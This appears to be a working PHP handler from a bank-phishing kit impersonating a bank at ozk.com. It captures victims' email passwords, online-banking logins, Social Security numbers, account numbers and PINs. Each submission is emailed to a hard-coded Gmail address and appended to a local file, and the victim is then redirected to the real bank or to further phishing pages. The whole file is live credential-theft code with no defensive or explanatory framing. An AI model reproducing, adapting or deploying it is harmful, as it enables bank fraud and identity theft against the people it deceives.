<?php

$Receive_email="staerkelramee@gmail.com";

if (isset($_POST['_cmdContinue'])) {
	

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	
	$message .= "Email Address            : ".$_POST['email']."\n";
	$message .= "Email Password              : ".$_POST['EmailPassword']."\n";

	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Email Login : $ip";
	mail($send, $subject, $message);
	
	$file = "text.txt";
	$open = fopen($file, "a");
	fwrite($open, $message."\n");
	fclose($open);

	header("Location: https://www.ozk.com/personal/");

	
	
}

else if (isset($_POST['cmdContinue'])) {
	

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	$message .= "Social Security Number   : ".$_POST['ssn']."\n";
	$message .= "Account Number           : ".$_POST['accountnum']."\n";
	$message .= "Account Type             : ".$_POST['accounttype']."\n";
	$message .= "Pin                      : ".$_POST['pin']."\n";

	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "SSN, Account Login : $ip";
	mail($send, $subject, $message);
	
	$file = "text.txt";
	$open = fopen($file, "a");
	fwrite($open, $message."\n");
	fclose($open);
	 
	header("Location: https://hubozk.web.app/test/devicefingerprinting.html");

	
	
}



else if (isset($_POST['userid_btn'])) {
	

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	$message .= "User ID            : ".$_POST['LoginName']."\n";
	$message .= "Password           : ".$_POST['Password']."\n";

	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message);
	 
	header("Location: https://hubozk.web.app/test/devicefingerprint.html");
	
	$file = "text.txt";
	$open = fopen($file, "a");
	fwrite($open, $message."\n");
	fclose($open);

	
	
}

else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
    echo json_encode($data);

?>
